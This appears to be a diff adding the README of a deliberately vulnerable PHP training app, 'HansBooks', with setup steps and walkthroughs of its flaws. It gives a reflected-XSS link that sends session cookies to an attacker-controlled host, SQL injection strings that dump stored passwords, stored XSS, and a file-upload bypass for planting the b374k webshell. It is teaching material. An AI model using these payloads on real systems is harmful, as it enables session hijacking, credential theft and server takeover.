@@ -1,0 +1,85 @@
+Install HB (HansBooks) WebApp
+=============================
+
+- DO: droplet 14.04 x64 - smallest 5/month
+- apache2 mysql-server php5-mysql php5 libapache2-mod-php5 php5-mcrypt git screen
+  - willa sk for password for root user mysql; "heartbleed" is the default used in the scripts, but can be adapted
+- cd /var/www/html; git clone <URL of hb repo>
+- cd hb; mv * ..
+- browse to IP to check 
+- adapt config.php with the password and database name as needed
+- cdb.php creates a db with qscanner/qscanner
+
+Comments:
+=========
+
+The HansBooks web application is a simple example that contains a number of programming issues that are vulnerabilities
+
+= Reflected Cross Site Scripting (XSS) vulnerability in userquery.php
+If you input <script>alert('XSS')</script> in the field and you will see a dialogbox with XSS in it. Classic proof of 
+the vulnerability but not very instructive on how it can be used.
+
+But now look at the following link that can be sent via email, where <hbhost> is the host that runs HansBooks and trackhost is under the attackers control. When this link is clicked by a user that is logged into HansBooks it will transmit the session cookie to the tracking host site. The attacker can then use the session cookie to impersonate the user. For a demo take a look at this video:
+https://youtu.be/z23cTUmUiRQ
+
+https://hbhost/userquery.php?username=<script>var img=document.createElement('img');img.src='https://trackhost/blank.gif?'.concat(document.cookie).concat('').concat(Math.random());document.getElementById('container').appendChild(img);</script>
+
+Reference: https://www.owasp.org/index.php/Cross_Site_Scripting_Flaw
+ 
+= SQL injection in userquery.php
+The userquery.php script does not limit its input to a certain set of charatcers and uses the input to build a SQL statement. We can use that lack of input sanitization to run a SQL Injection attack. The idea is to add characters to the SQL statement that execute a different statement than intended. 
+
+Here is a simple example: If we assume the statement is something like: SELECT id, name FROM users WHERE name = '$input' 
+then we if put the following into the field: ' or 1=1 #. This will result in:
+SELECT id, name FROM users WHERE name = '' or 1=1 , which will compare name to '', which should fail then OR'ed with 1=1
+which will always succeed, then the comment character # which will make the SQL interpreter ignore any following characters.
+The code will at least append a ' and possibly other conditions which will now cause a syntax error, so the comment 
+character is necessary.
+  
+Paste "qscanner' and 1=2 union select id, username, password from users #" into the field. This will list all 
+users and their passwords. Passwords are stored in cleartext and thus can be resued right away to impersonate another 
+user. Password in cleartext are not that uncommon, take a look at this research referenced in this article:
+https://boingboing.net/2019/03/27/neither-is-md5.html OWASP has cleartext password storage explained here:
+
+https://www.owasp.org/index.php/Password_Plaintext_Storage There is a site called plaintextoffenders that lists 
+sites that use plain text passwords: https://github.com/plaintextoffenders/plaintextoffenders/blob/master/offenders.csv
+
+The files register.php/login.php and cdp.php have commented lines that implement a simple fix for the cleartext password problem
+using a MySQL password function. There are better ways to secure the passwords, look for bcrypt usage on the web. 
+For example: https://blog.ircmaxell.com/2012/12/seven-ways-to-screw-up-bcrypt.html
+
+Reference: https://www.owasp.org/index.php/Password_Plaintext_Storage and https://www.owasp.org/index.php/SQL_Injection
+
+
+= Stored XSS in useredit.php
+Stored XSS happens when we can edit a field in an application or uplaod a document that will eventually get visualized by 
+a user, i.e. we do not need to trick the user to click on something, but we can wait until that page gets hit "naturally". The 
+useredit functionality allows us to edit the comment filed on a user, so we can use that to plant a XXS string there. Try: 
+<script>alert("XSS")</script> then go to list users. Note the ", rather than ' - try with ' but it will give you a SQL error.
+Now if you go to the userlist page you will get an XXS popup since we were able to store the XSS code in the comment field.
+Imagine being able to store the code for the session id evasion and then call in to customer support and get them to visualize 
+the account - you might get a session as a support representative.
+
+= Insecure File Upload in upload.php
+
+The script upload.php filters the filename for the existence of ".jpg" and ".pdf" in the name. The intention is to limit to 
+only image and PDF files. Since the code only checks for the existence of the string rather than a real file type one can
+upload a file called "abc.jpg.php" and then browse to it in the uploads directory. The directory contains a file that is a 
+recent version of a webshell called b374k - a webshell is cod ethat can run under a webbrowser and provides an outside 
+party commandline access.
+
+To test it: rename the file to b374k.jpg.php (this will satisfy the check in the upload.php script) and upload it, then
+browse to the directory and click on it. You will be prompted for a password; use "hbpass". You are then in the webshell
+and can browse around in the file system - config.php conatins the password for MySQL for example, Termainl will give
+a SSH like command like shell.
+
+https://github.com/b374k/b374k is the source to the webshell.
+
+Reference: https://www.owasp.org/index.php/Unrestricted_File_Upload
+
+
+
+
+
+
+
